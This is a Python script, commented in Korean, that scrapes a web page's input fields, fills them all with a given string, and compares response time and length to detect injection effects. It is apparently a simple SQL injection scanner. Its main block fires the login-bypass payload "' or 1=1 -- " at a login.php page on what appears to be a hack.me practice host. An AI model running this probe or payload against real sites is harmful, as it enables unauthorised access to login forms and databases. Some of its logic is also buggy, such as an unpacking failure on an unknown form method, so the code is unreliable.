import requests 
from bs4 import BeautifulSoup
import logging


test_logger = logging.getLogger("Tester")

# 로그 메시지 비활성화
logging.getLogger("urllib3").setLevel(logging.WARNING)

CHECK_LOADTIME_NUM = 10
time_to_load = 0.0


def get_input_fields(URL):
    # URL을 가져오고 그 URL에 있는 모든 입력 태그의 ID와 이름을 반환 
    # :매개변수: URL - 정보를 가져올 URL
	# html 페이지에 요청
	r = requests.get(URL)
	soup = BeautifulSoup(r.text, 'html.parser')

	# 모든 input 태그 확인
	fields = []
	for inpt in soup.find_all("input"):
	# 일부 사이트는 ID 대신 태그 이름을 사용하여 데이터 수신
		if "id" in inpt.attrs:
			fields.append(inpt["id"])
		elif "name" in inpt.attrs:
			fields.append(inpt["name"])
		elif inpt.attrs["type"].lower() == "submit":
			pass
		else:
			print("Can't handle this input tag:\n" + str(inpt))
		test_logger.debug(" Input Fields: {}".format(fields))
	return fields

def check_method(html):
    #지정된 html의 전송 방법이 POST인지 GET인지 확인
    soup = BeautifulSoup(html, 'html.parser')

    form_tag = soup.find_all("form")
    form_tag = form_tag[0]

    test_logger.debug(" Sending Method: {}".format(form_tag["method"]))
	# URL로 응답 보내기
    if "method" in form_tag.attrs and form_tag["method"].lower() == "post":
        return "post"
    elif "method" in form_tag.attrs and form_tag["method"].lower() == "get":
        return "get"
    else:
        return form_tag["method"].lower()

def check_loadtime(URL):
	global time_to_load
	if time_to_load != 0.0:
		return time_to_load

	time_avg = 0.0
	for x in range(CHECK_LOADTIME_NUM):
		item, tmp = get_info(URL)
		time_avg += item
	time_to_load = time_avg / CHECK_LOADTIME_NUM
	return time_to_load

def get_info(URL, s="abudy"):
    """
    이 함수는 지정된 문자열을 매개 변수로 사용하여 URL에 요청 수신
    함수는 응답 도착 시간과 다음 행 길이를 반환
    html
    :매개변수: URL - 데이터를 보낼 URL
    :매개변수: s - html을 확인할 문자열. 비어 있으면 임의 값이 사용
    """
    # 보낼 input 준비
    inputs = get_input_fields(URL)
    data = {}

    for inpt in inputs:
        data[inpt] = s

    # URL로 응답 보내기
    r = requests.get(URL)
    method = check_method(r.text)
    if method == "post":
        r = requests.post(URL, data=data)
    elif method == "get":
        r = requests.get(URL, data=data)
    else:
        print("Unknown method", method)
        return 0
    return r.elapsed.total_seconds(), len(r.text.split("\n"))


def payload_check(URL, payload):
	"""
    This is the proper wat to use this file.
    You give the funtion a url and a string, and the function checks
    whether or not the string has an impact on the site.
    return:
    error - to alert that the string is giving an error
    success - To alert that the string is working
    normal - to alert that there is no special impact on the site
    """

	normal_time, normal_length = get_info(URL)
	suspicious_time, suspicious_length = get_info(URL, payload)

	loadtime = check_loadtime(URL)
	test_logger.info(" Normal Time: {}, Normal Length: {}".format(normal_time, normal_length))
	test_logger.info(" Suspicious Time: {}, Suspicious Length: {}".format(suspicious_time, suspicious_length))

	if normal_length != suspicious_length:
		return "error"
    # 평균 LOAD TIME을 얻기위해 10번 점검

	if suspicious_time > 2 * time_to_load:
		return "success"

	return "normal"


if __name__ == '__main__':
	URL = "http://s130993-101229-fax.croto.hack.me/login.php"
	payload = "\' or 1=1 -- "
	print(payload_check(URL, payload))
